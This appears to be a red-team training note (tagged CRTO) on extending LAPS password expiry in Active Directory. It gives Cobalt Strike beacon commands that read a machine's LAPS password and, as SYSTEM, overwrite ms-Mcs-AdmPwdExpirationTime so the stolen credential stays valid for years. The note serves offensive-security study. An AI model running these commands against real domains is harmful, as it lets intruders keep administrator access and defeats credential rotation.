We can try to extend the password expiration date so we don't have to worry about losing our access via the pwned password of property `ms-Mcs-AdmPwd`


#### 🖊️ LAPS policy settings

The `_PwdExpirationProtectionEnabled_` property prevents a user or computer setting the expiration date of a password beyond the password age specified in the _PasswordAgeDays_ setting. If password expiration protection is enabled and we try to change the expiration date of `_PwdExpirationProtectionEnabled_` then a trigger happens and we get blocked. 

If the policy setting is left "not configured" in the GPO, then password expiration protection is disabled by default.

#### 📔 via Cobalt Strike

1) The expiration date is an 18-digit timestamp calculated as the number of 100-nanosecond intervals (weird system). We can enumerate the expiration:

```
beacon> powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

ms-mcs-admpwdexpirationtime ms-mcs-admpwd 
--------------------------- ------------- 
         133101494718702551 1N3FyjJR5L18za
```

[Time converter](https://www.epochconverter.com/ldap)
Where `133101494718702551` is Thursday, 13 October 2022 15:44:31 GMT.

2) If we wanted to push the expiry out by 10 years, we can overwrite this value with `136257686710000000`.  Every computer has delegated access to write to this password field, so we must elevate to SYSTEM on WKSTN-1.

```
beacon> run hostname
wkstn-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> powershell Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose


Setting 'ms-Mcs-AdmPwdExpirationTime' to '136257686710000000' for object 'WKSTN-1$'
```

 ⚠ The expiration date will still be visible to admins and a manual reset will change the password and restore the expiration date.




### Properties
---
📆 created   {{28-02-2024}} 09:26
🏷️ tags: #redteam #crto 

---

